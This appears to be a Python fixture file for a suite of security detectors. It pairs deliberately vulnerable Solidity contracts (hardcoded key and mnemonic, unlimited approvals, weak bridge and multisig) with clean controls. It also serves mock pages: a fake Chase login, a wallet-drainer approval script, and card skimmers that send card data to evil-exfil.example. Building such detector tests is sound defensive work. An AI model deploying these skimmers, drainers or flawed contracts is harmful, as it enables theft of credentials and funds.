"""Fixtures for the ten target-surface detectors.

Contract fixtures are realistic-but-minimal Solidity: the vulnerable
fixture MUST fire its own detector, the clean control MUST stay
silent under ALL seven contract detectors, and every other
detector's vulnerable fixture MUST stay silent under this one
(no cross-talk). Web fixtures are full HTML/JS pages served by the
test's MockTransport.
"""
# A 64-hex private key (not a placeholder: not all-same-digit, not
# a Hardhat default, not deadbeef).
HEX_KEY = ("0x3f8a2c1e9b5d476a0c3f7e1a9b2d5c8f0e6a4b7d1c9e3f5a7b0d2e4f"
           "6a8c1d3e")
# The canonical BIP-39 test mnemonic (checksum-valid).
MNEMONIC = ("abandon abandon abandon abandon abandon abandon abandon "
            "abandon abandon abandon abandon about")

VULN = {}

VULN["hardcoded_key_mnemonic_in_source"] = f"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract DeployerWallet {{
    bytes32 private constant DEPLOYER_KEY = {HEX_KEY};
    string private constant SEED_PHRASE = "{MNEMONIC}";
    address public owner;
    constructor() {{ owner = msg.sender; }}
    function withdraw(address to, uint256 amount) external {{
        require(msg.sender == owner);
        payable(to).transfer(amount);
    }}
}}
"""

VULN["malicious_token_approval"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}
contract SweepVault {
    IERC20 public token;
    constructor(address t) { token = IERC20(t); }
    function sweep(address spender) external {
        token.approve(spender, type(uint256).max);
    }
    function doPermit(address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        token.permit(msg.sender, spender, value, deadline, v, r, s);
    }
}
"""

VULN["cex_api_key_in_contract"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract TradingBot {
    string private constant BINANCE_API_KEY = "4f8a2c1e9b5d476a0c3f7e1a9b2d5c8f0e6a4b7d1c9e3f5a7b0d2e4f6a8c1";
    string private constant BINANCE_SECRET = "9b5d476a0c3f7e1a9b2d5c8f0e6a4b7d1c9e3f5a7b0d2e4f6a8c1d3e5f7a9";
    function name() public pure returns (string memory) {
        return "Binance";
    }
    function symbol() public pure returns (string memory) {
        return "BINANCE";
    }
}
"""

VULN["permit2_allowance_abuse"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IPermit2 {
    function permit(address owner, address spender, address token, uint160 amount) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
}
contract Permit2Spender {
    IPermit2 public constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    function allow(address spender, address token, uint160 amount) external {
        PERMIT2.permit(msg.sender, spender, token, amount);
    }
    function pull(address from, address to, uint160 amount, address token) external {
        PERMIT2.transferFrom(from, to, amount, token);
    }
}
"""

VULN["bridge_trust_concentration"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract SimpleBridge {
    address public relayer;
    mapping(address => uint256) public balances;
    constructor(address r) { relayer = r; }
    function execute(bytes calldata payload) external {
        require(msg.sender == relayer, "only relayer");
        (address to, uint256 amount) = abi.decode(payload, (address, uint256));
        balances[to] += amount;
    }
    function mint(address to, uint256 amount) external {
        require(msg.sender == relayer, "only relayer");
        balances[to] += amount;
    }
}
"""

VULN["governance_delegate_guardian_bypass"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract Gov {
    mapping(address => address) public delegates;
    mapping(address => uint256) public votes;
    address public guardian;
    constructor(address g) { guardian = g; }
    function delegate(address account, address delegatee) external {
        delegates[account] = delegatee;
        votes[delegatee] += votes[account];
    }
    modifier onlyGuardian() {
        require(msg.sender == guardian, "only guardian");
        _;
    }
    function execute(uint256 proposalId) external onlyGuardian {
        (bool ok, ) = address(this).call(
            abi.encodeWithSignature("doExecute(uint256)", proposalId));
        require(ok);
    }
}
"""

VULN["multisig_threshold_weakness"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract WeakMultisig {
    address[] public owners;
    uint256 public threshold = 1;
    constructor(address o) { owners.push(o); }
    function addOwner(address o) external {
        owners.push(o);
    }
    function changeThreshold(uint256 t) external {
        threshold = t;
    }
    function exec(address to, bytes calldata data) external {
        (bool ok, ) = to.delegatecall(data);
        require(ok);
    }
}
"""

CLEAN = {}

CLEAN["clean_contract"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract CleanToken {
    bytes32 public merkleRoot = 0x3f8a2c1e9b5d476a0c3f7e1a9b2d5c8f0e6a4b7d1c9e3f5a7b0d2e4f6a8c1d3e;
    bytes32 public publicKey = 0x3f8a2c1e9b5d476a0c3f7e1a9b2d5c8f0e6a4b7d1c9e3f5a7b0d2e4f6a8c1d3e;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address public constant ROUTER = 0x0000000000000000000000000000000000000001;
    function approveRouter() external {
        allowance[msg.sender][ROUTER] = type(uint256).max;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}
"""

CLEAN["clean_router"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
}
contract CleanRouter {
    IERC20 public token;
    address public constant ROUTER = 0x0000000000000000000000000000000000000001;
    address public owner;
    constructor(address t) { token = IERC20(t); owner = msg.sender; }
    modifier onlyOwner() { require(msg.sender == owner); _; }
    function approveRouter() external onlyOwner {
        token.approve(ROUTER, type(uint256).max);
    }
    function selfPermit(uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        token.permit(msg.sender, address(this), value, deadline, v, r, s);
    }
}
"""

CLEAN["clean_permit2"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IPermit2 {
    function permit(address owner, address spender, address token, uint160 amount) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
}
contract CleanPermit2User {
    IPermit2 public constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    address public constant VAULT = 0x0000000000000000000000000000000000000002;
    function allowFixed(address token, uint160 amount) external {
        PERMIT2.permit(msg.sender, VAULT, token, amount);
    }
    function pullFixed(address from, uint160 amount, address token) external {
        PERMIT2.transferFrom(from, VAULT, amount, token);
    }
}
"""

CLEAN["clean_bridge"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract CleanBridge {
    uint256 public quorum = 3;
    mapping(address => bool) public validators;
    mapping(bytes32 => bool) public spent;
    function execute(bytes calldata payload, bytes[] calldata signatures) external {
        require(signatures.length >= quorum, "quorum");
        bytes32 digest = keccak256(payload);
        require(!spent[digest], "spent");
        uint256 count = 0;
        for (uint256 i = 0; i < signatures.length; i++) {
            address signer = ecrecover(digest, 27, bytes32(signatures[i]), bytes32(signatures[i]));
            if (validators[signer]) { count += 1; }
        }
        require(count >= quorum, "quorum not met");
        spent[digest] = true;
    }
    function mint(address to, uint256 amount, bytes32[] calldata proof) external {
        require(verifyMerkleProof(proof, to, amount), "bad proof");
    }
    function verifyMerkleProof(bytes32[] calldata proof, address to, uint256 amount) internal pure returns (bool) {
        return proof.length > 0;
    }
}
"""

CLEAN["clean_governance"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract CleanGov {
    mapping(address => address) public delegates;
    mapping(address => uint256) public votes;
    mapping(uint256 => uint256) public eta;
    uint256 public votingDelay = 100;
    function delegate(address delegatee) external {
        _moveDelegates(msg.sender, delegatee);
        delegates[msg.sender] = delegatee;
    }
    function _moveDelegates(address from, address to) internal {
        votes[to] += votes[from];
        votes[from] = 0;
    }
    function getPastVotes(address a, uint256 b) public view returns (uint256) {
        return votes[a];
    }
    function execute(uint256 proposalId) external {
        require(state(proposalId) == 1, "not succeeded");
        require(block.timestamp >= eta[proposalId], "timelock");
    }
    function state(uint256 proposalId) public pure returns (uint256) {
        return 1;
    }
}
"""

CLEAN["clean_multisig"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract CleanMultisig {
    address[] public owners;
    uint256 public threshold = 2;
    mapping(bytes32 => uint256) public confirmations;
    constructor(address a, address b) {
        owners.push(a);
        owners.push(b);
    }
    modifier onlyWallet() {
        require(msg.sender == address(this), "only wallet");
        _;
    }
    function addOwner(address o) external onlyWallet {
        owners.push(o);
    }
    function changeThreshold(uint256 t) external onlyWallet {
        require(t >= 2 && t <= owners.length, "bad threshold");
        threshold = t;
    }
    function exec(address to, uint256 value, bytes calldata data) external {
        bytes32 txHash = keccak256(abi.encode(to, value, data));
        require(confirmations[txHash] >= threshold, "need confirmations");
        (bool ok, ) = to.call{value: value}(data);
        require(ok);
    }
}
"""

CLEAN["clean_proxy_slots"] = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
// Regression (live smoke, 2026-11-11): L1ChugSplashProxy-style
// EIP-1967 slot constants. IMPLEMENTATION_KEY / OWNER_KEY are
// keccak-derived storage slots, not private keys, and the fallback
// delegatecall belongs to a proxy, not a multisig. Must stay
// silent under every contract detector.
contract CleanProxySlots {
    /** @notice bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1) */
    bytes32 internal constant IMPLEMENTATION_KEY =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    /** @notice bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1) */
    bytes32 internal constant OWNER_KEY =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;
    function _getImplementation() internal view returns (address impl) {
        assembly { impl := sload(IMPLEMENTATION_KEY) }
    }
    function _getOwner() internal view returns (address owner_) {
        assembly { owner_ := sload(OWNER_KEY) }
    }
    fallback() external payable {
        address target = _getImplementation();
        require(target != address(0), "no implementation");
        (bool ok, ) = target.delegatecall(msg.data);
        require(ok);
    }
}
"""

# ---------------------------------------------------------------------------
# Web fixtures: (host, path) -> body. Served by the test MockTransport.
# ---------------------------------------------------------------------------

WEB = {}

WEB[("evil-bank.example", "/")] = """<!DOCTYPE html>
<html><head><title>Chase Online Banking - Sign In</title></head>
<body><h1>Chase</h1>
<p>Sign in to your Chase account to verify your identity.</p>
<form action="https://evil-collect.example/submit" method="post">
<input type="text" name="username">
<input type="password" name="password">
<input type="submit" value="Sign in">
</form></body></html>"""

WEB[("chase.com", "/")] = """<!DOCTYPE html>
<html><head><title>Chase Online Banking - Sign In</title></head>
<body><h1>Chase</h1>
<form action="/login" method="post">
<input type="text" name="username">
<input type="password" name="password">
<input type="submit" value="Sign in">
</form></body></html>"""

WEB[("news.example", "/")] = """<!DOCTYPE html>
<html><head><title>Chase posts strong quarter</title></head>
<body><h1>Chase posts strong quarter</h1>
<p>Chase reported earnings today. Analysts were pleased.</p>
<a href="/login">Login</a></body></html>"""

WEB[("evil-dapp.example", "/")] = """<!DOCTYPE html>
<html><head><title>Free Token Claim</title></head>
<body><h1>Claim your free reward tokens now!</h1>
<button id="claim">Claim free tokens</button>
<script src="/app.js"></script></body></html>"""

WEB[("evil-dapp.example", "/app.js")] = """
document.getElementById('claim').onclick = async () => {
  const data = '0x095ea7b3' + '000000000000000000000000' + '1111111111111111111111111111111111111111' + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
  await window.ethereum.request({method: 'eth_sendTransaction', params: [{to: '0x2222222222222222222222222222222222222222', data: data}]});
};
"""

WEB[("evil-sign.example", "/")] = """<!DOCTYPE html>
<html><head><title>Verify your wallet</title></head>
<body><h1>Verify your wallet to continue</h1>
<script src="/sign.js"></script></body></html>"""

WEB[("evil-sign.example", "/sign.js")] = """
const domain = {name: 'MetaMask', version: '1', chainId: 1, verifyingContract: '0x3333333333333333333333333333333333333333'};
const types = {Permit: [{name: 'owner', type: 'address'}, {name: 'spender', type: 'address'}]};
await window.ethereum.request({method: 'eth_signTypedData_v4', params: [account, JSON.stringify({domain, types})]});
"""

WEB[("evil-chain.example", "/")] = """<!DOCTYPE html>
<html><head><title>Ethereum NFT Mint</title></head>
<body><h1>Mint on Ethereum</h1>
<script src="/mint.js"></script></body></html>"""

WEB[("evil-chain.example", "/mint.js")] = """
const domain = {name: 'MintPass', version: '1', chainId: 56, verifyingContract: '0x4444444444444444444444444444444444444444'};
await window.ethereum.request({method: 'eth_signTypedData_v4', params: [account, JSON.stringify({domain})]});
"""

WEB[("clean-dapp.example", "/")] = """<!DOCTYPE html>
<html><head><title>Swap tokens</title></head>
<body><h1>Swap</h1>
<button id="swap">Swap tokens</button>
<script src="/swap.js"></script></body></html>"""

WEB[("clean-dapp.example", "/swap.js")] = """
document.getElementById('swap').onclick = async () => {
  const to = document.getElementById('to').value;
  const data = '0xa9059cbb' + to.slice(2).padStart(64, '0') + (100).toString(16).padStart(64, '0');
  await window.ethereum.request({method: 'eth_sendTransaction', params: [{to: token, data: data}]});
};
const domain = {name: 'CleanSwap', version: '1', chainId: 1, verifyingContract: '0x5555555555555555555555555555555555555555'};
"""

WEB[("evil-shop.example", "/")] = """<!DOCTYPE html>
<html><head><title>Checkout</title></head>
<body><h1>Checkout</h1>
<form action="/pay" method="post">
<input type="text" name="cardNumber" id="cardNumber">
<input type="text" name="cvv" id="cvv">
<input type="text" name="expiry" id="expiry">
<input type="submit" value="Pay">
</form>
<script src="/checkout.js"></script></body></html>"""

WEB[("evil-shop.example", "/checkout.js")] = """
const card = {
  number: document.querySelector('#cardNumber').value,
  cvv: document.querySelector('#cvv').value,
  expiry: document.querySelector('#expiry').value
};
fetch('https://evil-exfil.example/collect', {method: 'POST', body: JSON.stringify(card)});
"""

WEB[("evil-shop2.example", "/")] = """<!DOCTYPE html>
<html><head><title>Checkout</title></head>
<body><h1>Checkout</h1>
<input type="text" name="cardNumber" id="cardNumber">
<input type="text" name="cvv" id="cvv">
<script src="/s.js"></script></body></html>"""

WEB[("evil-shop2.example", "/s.js")] = """
var _0x1a2b = String.fromCharCode(104,116,116,112,115);
var _0x9f = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBoaWRlIHRoZSBza2ltbWVyIHBheWxvYWQgZnJvbSBzdGF0aWMgYW5hbHlzaXMgYW5kIG1ha2UgaXQgaGFyZGVyIHRvIHNwb3QgaW4gdGhlIGJ1bmRsZSB3aXRob3V0IGR5bmFtaWMgYW5hbHlzaXMgb3IgZGVvYmZ1c2NhdGlvbg==";
var cardNumber = document.querySelector('#cardNumber').value;
var cvv = document.querySelector('#cvv').value;
eval(atob(_0x9f));
"""

WEB[("clean-shop.example", "/")] = """<!DOCTYPE html>
<html><head><title>Checkout</title></head>
<body><h1>Checkout</h1>
<div id="card-element"></div>
<script src="/pay.js"></script></body></html>"""

WEB[("clean-shop.example", "/pay.js")] = """
const stripe = Stripe('pk_test_123');
const elements = stripe.elements();
const card = elements.create('card', {hidePostalCode: true});
card.mount('#card-element');
fetch('https://api.stripe.com/v1/payment_methods', {method: 'POST', body: JSON.stringify({type: 'card'})});
"""
